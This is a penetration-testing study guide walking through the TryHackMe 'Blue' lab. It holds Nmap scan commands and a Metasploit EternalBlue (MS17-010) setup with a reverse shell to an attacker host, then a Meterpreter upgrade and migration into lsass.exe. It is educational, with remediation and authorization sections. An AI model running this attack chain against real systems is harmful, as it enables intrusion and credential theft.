5-Phase Penetration Testing Study Guide

Hands-on walk-through based on the TryHackMe "Blue" machine tutorial.

The 5-Phase Methodology (Deep-Dive)

  1. Phase 1: Reconnaissance (Information Gathering)
    Acquiring actionable intelligence without intrusive contact. Includes Passive Reconnaissance (WHOIS, DNS zone transfers via dig, GHDB dorks, subdomains via amass) and Active Reconnaissance (direct host probes, banner grabbing, footprinting public services) under explicit Rules of Engagement (RoE).
  2. Phase 2: Scanning & Enumeration (Network Mapping)
    Converting IP addresses into targets by probing TCP/UDP ports (0–65535) for status (open, closed, filtered), identifying service banners/OS fingerprints, and mapping version numbers to CVE databases using Nmap NSE scripts.
  3. Phase 3: Exploitation (Gaining Access)
    Leveraging software misconfigurations or unpatched vulnerabilities (e.g., MS17-010 / CVE-2017-0144). Stages payloads (inline shellcode or reverse shells) to establish a back-channel communication link while bypassing endpoint defenses without crashing the target.
  4. Phase 4: Access Maintenance & Post-Exploitation
    Solidifying access by escalating privileges from low-rights service accounts (e.g., www-data) to administrative levels (NT AUTHORITY\SYSTEM or root), upgrading command shells to encrypted C2 agents (Meterpreter), dumping hashes via Mimikatz, and pivoting across internal subnets.
  5. Phase 5: Reporting & Remediation Guidance
    Translating technical exploits into actionable business intelligence with step-by-step PoC logs, CVSS v3/v4 severity ratings, operational impact analysis, and direct patching links (e.g., KB4012598).

Step-by-Step Technical Walkthrough

Phase 1 & 2: Network Scanning & Enumeration

Execute targeted Nmap scans to map active network interfaces and service vulnerabilities:

# 1. Fast initial port discovery scan (top 1000 ports)
nmap -sS --min-rate 5000 [TARGET_IP]

# 2. Comprehensive service version detection scan across open ports
nmap -sV -p 135,139,445 [TARGET_IP]

# 3. Targeted vulnerability assessment script for MS17-010 (EternalBlue)
nmap -sC -p 445 --script smb-vuln-ms17-010 [TARGET_IP]

Nmap Flag Reference:

  • -sS — Stealth SYN scan; sends TCP SYN packets without completing the 3-way handshake to minimize logging.
  • -sV — Service Version detection; sends protocol-specific probes to extract exact version strings.
  • -sC — Safe Default Scripts; runs standard Nmap scripts for basic vulnerability checking.
  • --script smb-vuln-ms17-010 — Directly queries SMBv1 endpoints for Remote Code Execution exposure.

Phase 3: Exploitation Configuration

# Search offline Exploit Database repositories
searchsploit smb windows | grep -i "EternalBlue"

# Launch and configure Metasploit Framework
msfconsole -q
search eternalblue
use exploit/windows/smb/ms17_010_eternalblue

# Define module environment parameters
set RHOSTS [TARGET_IP]
set LHOST [ATTACKBOX_IP]
set LPORT 4444
set PAYLOAD windows/x64/shell/reverse_tcp

# Verify vulnerability status before payload delivery
check
exploit

Phase 4: Post-Exploitation & Process Migration

# Step 1: Background the current basic command shell
CTRL + Z  (Type 'y' and press Enter)

# Step 2: Convert shell to full Meterpreter session
use post/multi/manage/shell_to_meterpreter
show options
set SESSION 1
set LHOST [ATTACKBOX_IP]
run

# Step 3: Interact with upgraded session & verify privilege level
sessions -i 2
getuid
# Expected output: NT AUTHORITY\SYSTEM

# Step 4: Stabilize C2 session by migrating into a system process
ps
migrate [PROCESS_ID]  # e.g., lsass.exe or services.exe PID

# Step 5: System Reconnaissance & Flag Extraction
shell
whoami /all
dir /s C:\flag*
type C:\flag1.txt

Nmap Command Flags Reference

Key Nmap options used during the scanning phase:

  • -sV — Service Version Detection: Probes open ports to determine service/version info.
  • -sC — Default Scripts: Runs a collection of standard Nmap Scripts (NSE) for basic checks.
  • -p [port] — Target Port: Specifies a single port or range (e.g., -p 445 or -p 1-1024).
  • --script [name] — Specific Script: Runs a targeted NSE vulnerability detection script.

Troubleshooting & Common Fixes

  • Exploit Fails / No Session: MS17-010 (EternalBlue) can be timing-sensitive. Rerun exploit a second or third time.
  • LHOST Misconfiguration: Ensure LHOST is set to your AttackBox's IP address (often the tun0 interface), not the target IP or localhost.
  • Target Unreachable: Verify the target machine hasn't timed out on TryHackMe. Ping the target IP to confirm connectivity.

Execution Checklist

  1. [ ] Verify Authorization: Confirm target IP is within the authorized scope.
  2. [ ] Scan Target: Run nmap -sV -sC -p 445 [TARGET_IP].
  3. [ ] Confirm Vulnerability: Check output for VULNERABLE state on MS17-010.
  4. [ ] Configure Exploit: Set RHOSTS and LHOST in Metasploit.
  5. [ ] Execute & Stabilize: Run exploit, upgrade shell to Meterpreter, and migrate process.
  6. [ ] Document Findings: Capture flags and record steps for the final report.

Defensive Controls & Remediation

In cybersecurity, identifying a vulnerability must always lead to mitigation and defense. Key strategies for securing enterprise networks include:

  • System Patching: Regularly applying security updates (such as Microsoft KB bulletins) to address known software flaws.
  • Disabling Legacy Protocols: Disabling outdated services (like SMBv1) that lack modern encryption and integrity checks.
  • Network Segmentation & Firewalls: Restricting port access (e.g., blocking Port 445 externally) to limit internal service exposure.
  • Principle of Least Privilege: Ensuring services and applications execute with minimal required permissions rather than elevated system rights.

Professional Reporting Structure

A professional security assessment report delivers actionable value by detailing risks and steps for remediation:

  1. Executive Summary: High-level business impact overview tailored for leadership.
  2. Scope & Rules of Engagement: Clearly defined testing boundaries and authorization parameters.
  3. Vulnerability Findings: Detailed technical breakdown, risk severity rating, and proof of concept.
  4. Remediation Guidance: Step-by-step instructions for system administrators to resolve identified issues.

Ethical Guiding Principles

Only test systems you own or have explicit, written authorization to evaluate. Unsanctioned scanning or testing is illegal.
